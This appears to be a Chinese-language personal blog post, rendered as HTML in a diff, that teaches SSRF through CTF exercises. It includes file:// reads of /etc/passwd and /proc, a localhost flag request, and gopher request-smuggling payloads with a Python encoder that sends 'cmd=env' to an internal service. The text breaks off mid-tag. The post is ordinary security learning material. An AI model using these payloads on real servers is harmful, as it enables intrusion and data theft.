@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 \u200b ghctf2025遇到了第一次ssrf的题目，这里开始系统的学一下ssrf，例题从ctfshow找。 一、什么是SSRF \u200b SSRF（Se">
+<title>SSRF</title>
+
+<link rel='canonical' href='http://localhost:1313/p/ssrf/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="SSRF">
+<meta property='og:description' content="前言 \u200b ghctf2025遇到了第一次ssrf的题目，这里开始系统的学一下ssrf，例题从ctfshow找。 一、什么是SSRF \u200b SSRF（Se">
+<meta property='og:url' content='http://localhost:1313/p/ssrf/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-11T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="SSRF">
+<meta name="twitter:description" content="前言 \u200b ghctf2025遇到了第一次ssrf的题目，这里开始系统的学一下ssrf，例题从ctfshow找。 一、什么是SSRF \u200b SSRF（Se">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#一什么是ssrf">一、什么是SSRF</a></li>
+    <li><a href="#二ssrf的利用方式">二、SSRF的利用方式</a>
+      <ol>
+        <li><a href="#例题一ctfshowweb351">例题一：ctfshowweb351</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" >
+                知识点总结
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/ssrf/">SSRF</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-03-11</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>​	ghctf2025遇到了第一次ssrf的题目，这里开始系统的学一下ssrf，例题从ctfshow找。</p>
+<h2 id="一什么是ssrf">一、什么是SSRF
+</h2><p>​	SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。</p>
+<p>​	<img src="/p/ssrf/image-20250329180935488.png"
+	width="916"
+	height="547"
+	srcset="/p/ssrf/image-20250329180935488_hu10618194135568254254.png 480w, /p/ssrf/image-20250329180935488_hu15194048558687650697.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250329180935488"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="167"
+		data-flex-basis="401px"
+	
+></p>
+<p>​	由于防火墙的保护，我们无法直接访问内网，但是服务器可以，我们可以通过服务器来访问内网，这就是SSRF。
+​	给个简单的例子，攻击者传入一个未经验证的URL，后端代码直接请求这个URL，就会造成SSRF漏洞。</p>
+<p>​	具体到代码中则为：</p>
+<p>curl_exec()</p>
+<p>​		通过cURL库发起HTTP请求时，若URL由用户输入控制且未验证协议（如<code>file://</code>, <code>dict://</code>, <code>gopher://</code>等），可导致任意文件读取或内网访问。</p>
+<p>file_get_contents()</p>
+<p>​		支持多种协议（如http://, <code>https://</code>, <code>file://</code>），若直接拼接用户输入，可读取本地文件或访问内网资源。</p>
+<ol start="3">
+<li>fopen()+ fread()</li>
+</ol>
+<p>​		与<code>file_get_contents()</code>类似，支持协议包装器（<code>file://</code>, <code>http://</code>等）</p>
+<h2 id="二ssrf的利用方式">二、SSRF的利用方式
+</h2><p>​	主要是一些伪协议的运用。</p>
+<p>​	file伪协议：从文件系统中获取文件内容,格式为file://[文件路径]</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">	file:///etc/passwd ，读取文件
+</span></span><span class="line"><span class="cl">	file:///etc/hosts                显示当前操作系统网卡的IP
+</span></span><span class="line"><span class="cl">	file:///proc/net/arp           显示arp缓存表(寻找内网其他主机)
+</span></span><span class="line"><span class="cl">	file:///proc/net/fib _trie     显示当前网段路由信息
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	也可直接读取flag</p>
+<p>​	http伪协议：常规URL形式，允许通过HTTP 1.0的GET方法，以只读访问文件或资源。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">file</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">var1</span> <span class="o">=</span><span class="n">val1</span> <span class="o">&amp;</span><span class="n">var2</span><span class="o">=</span><span class="n">val2</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">user</span><span class="p">:</span><span class="n">password</span><span class="err">@</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">file</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">var1</span> <span class="o">=</span><span class="n">val1</span> <span class="o">&amp;</span><span class="n">var2</span><span class="o">=</span><span class="n">val2</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">user</span><span class="p">:</span><span class="n">password</span><span class="err">@</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="例题一ctfshowweb351">例题一：ctfshowweb351
+</h3><p>​			<img src="/p/ssrf/image-20250330112041857.png"
+	width="784"
+	height="471"
+	srcset="/p/ssrf/image-20250330112041857_hu16625410681241850352.png 480w, /p/ssrf/image-20250330112041857_hu3381956066808889969.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250330112041857"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="399px"
+	
+></p>
+<p>​</p>
+<p>​			题目要求post一个url，这里解释一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 初始化 cURL 会话，目标地址为用户提供的 URL
+</span></span></span><span class="line"><span class="cl"><span class="c1">//cURL默认支持多种协议（包括file://）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 设置 cURL 选项：不包含响应头
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 设置 cURL 选项：将响应结果返回为字符串（而非直接输出）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 执行 cURL 请求并获取响应内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$result</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 关闭 cURL 会话
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 输出响应内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​		有个flag.php，但是直接访问的话会显示禁止非本地用户访问</p>
+<p><img src="/p/ssrf/image-20250330132931605.png"
+	width="1106"
+	height="687"
+	srcset="/p/ssrf/image-20250330132931605_hu15340876545474722325.png 480w, /p/ssrf/image-20250330132931605_hu1894488416328823909.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250330132931605"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="160"
+		data-flex-basis="386px"
+	
+></p>
+<p>​		我们url传入file:///var/www/html/flag.php，然后在源代码可以找到flag</p>
+<p><img src="/p/ssrf/image-20250330133742706.png"
+	width="666"
+	height="550"
+	srcset="/p/ssrf/image-20250330133742706_hu15755748321175597399.png 480w, /p/ssrf/image-20250330133742706_hu9183653780769927100.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250330133742706"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="290px"
+	
+></p>
+<p>​		当然也可以用http协议，因为要本地用户访问，我们构造pyload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">url</span><span class="o">=</span>http://127.0.0.1/flag.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ssrf/image-20250330200538202.png"
+	width="1835"
+	height="711"
+	srcset="/p/ssrf/image-20250330200538202_hu12477632485707479067.png 480w, /p/ssrf/image-20250330200538202_hu17668145317689097286.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250330200538202"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="258"
+		data-flex-basis="619px"
+	
+></p>
+<hr>
+<p>​	dict、ftp伪协议</p>
+<p>​	用于端口扫描，对于ctf的题目帮助不大，这里不多做赘述</p>
+<p>​	gopher伪协议：可用于GET提交、POST提交、redis、fastcgi、sql</p>
+<p>​		基本格式：gopher://&lt;目标IP&gt;：&lt;端口&gt;/<gopher-path></p>
+<p>​		GET提交</p>
+<p>​		示例：提交/flag.php?flag=123，HTTP/1.1，目标主机为127.0.0.1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://127.0.0.1:80/_get /flag.php?flag=123 HTTP/1.1
+</span></span><span class="line"><span class="cl">Host 127.0.0.1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​		这是第一步，接下来需要url转码，这里需要注意以下几点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注意添加端口号80和填充位
+</span></span><span class="line"><span class="cl">URL编码
+</span></span><span class="line"><span class="cl">空格        %20
+</span></span><span class="line"><span class="cl">问号        %3f
+</span></span><span class="line"><span class="cl">换行符        %0d%0A
+</span></span><span class="line"><span class="cl">1、问号(?)需要转码为URL编码，也就是%3f
+</span></span><span class="line"><span class="cl">2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
+</span></span><span class="line"><span class="cl">3、在HTTP包的最后要加%0d%0a（换行符），代表消息结束(具体可研究HTTP包结束)
+</span></span><span class="line"><span class="cl">4、URL编码改为大写,冒号注意英文冒号
+</span></span><span class="line"><span class="cl">5、如果使用BP发包需要进行两次url编码
+</span></span><span class="line"><span class="cl">6、GET提交最后需要增加一个换行符
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​		然后编码为（bp提交需要二次url编码）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://127.0.0.1:80/_GET%20/flag.php%3fflag=123%20HTTP/1.1%0d%0AHost:%20127.0.0.1%0d%0A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	POST提交</p>
+<p>​	示例：要提交的内容同上，但是需要东西不一样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /flag.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host:127.0.0.1
+</span></span><span class="line"><span class="cl">Content-Type:application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length:8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">flag=123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	这些东西可以通过抓一次包之后生成</p>
+<p>​	之后还是要进行编码，可以用编码脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span>\
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;POST /Manage HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="s2">Host: 127.0.0.1:8000
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Length: 7
+</span></span></span><span class="line"><span class="cl"><span class="s2">cmd=env
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">#注意后面一定要有回车，回车结尾表示http请求结束</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;%0A&#39;</span><span class="p">,</span><span class="s1">&#39;%0D%0A&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;gopher://0.0.0.0:8000/&#39;</span><span class="o">+</span><span class="s1">&#39;_&#39;</span><span class="o">+</span><span class="n">new</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>       <span class="c1"># 这里因为是GET请求所以要进行两次url编码</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">#gopher%3A//0.0.0.0%3A8000/_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​</p>
+<p>​	然后其他提交就可以用自动生成工具了，Gopherus，主要是用来生成打MySQL和Redis的pyload（还有很多别的）</p>
+<p><img src="/p/ssrf/image-20250402135021970.png"
+	width="1256"
+	height="427"
